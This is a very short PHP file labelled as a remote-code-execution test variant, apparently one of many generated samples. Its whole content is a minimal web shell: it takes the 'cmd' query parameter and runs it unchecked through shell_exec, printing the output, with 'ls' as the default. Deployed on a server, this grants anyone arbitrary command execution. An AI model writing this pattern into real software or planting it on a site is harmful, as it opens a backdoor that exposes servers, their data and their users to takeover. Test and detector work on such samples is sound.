<?php
// RCE test variation #886
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>